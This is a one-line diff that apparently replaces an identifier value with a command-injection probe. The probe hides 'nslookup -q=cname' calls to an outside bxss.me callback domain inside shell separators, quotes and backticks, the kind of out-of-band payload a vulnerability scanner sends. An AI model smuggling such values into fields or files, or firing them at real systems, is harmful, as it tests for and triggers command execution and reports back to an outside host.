@@ -1,1 +1,1 @@
-MO_102133002179_005/.
+&nslookup -q=cname hitqxqpnwfxsyf53bd.bxss.me&'\"`0&nslookup -q=cname hitqxqpnwfxsyf53bd.bxss.me&`'
